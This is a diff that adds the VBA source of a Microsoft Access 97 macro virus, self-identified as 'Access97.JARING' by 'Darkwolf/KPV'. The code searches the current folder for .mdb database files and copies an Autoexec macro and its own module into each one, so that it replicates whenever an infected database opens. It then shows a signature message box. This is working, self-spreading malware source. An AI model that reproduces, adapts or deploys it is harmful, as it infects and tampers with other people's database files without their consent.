@@ -1,0 +1,28 @@
+   Attribute VB_Name = "JARINGNetwork"
+   Dim fname As String
+   Option Compare Database
+   Option Explicit
+   Public Sub findmdbfiles()
+   fname = Dir("*.mdb", vbNormal)
+   End Sub
+   Public Sub infectmdbfiles()
+   On Error GoTo errhandler
+   DoCmd.TransferDatabase acExport, "Microsoft Access", fname, acMacro, "Autoexec", "Autoexec"
+   DoCmd.TransferDatabase acExport, "Microsoft Access", fname, acModule, "JARING", "JARING"
+   errhandler:
+   End Sub
+   Public Function MAIN()
+   Call findmdbfiles
+   Call infectmdbfiles
+   While fname <> ""
+   Call findnextmdb
+   Call infectmdbfiles
+   Wend
+   Call payload
+   End Function
+   Public Sub findnextmdb()
+   fname = Dir
+   End Sub
+   Public Sub payload()
+   MsgBox "Access97.JARING - Written By Darkwolf/KPV"
+   End Sub
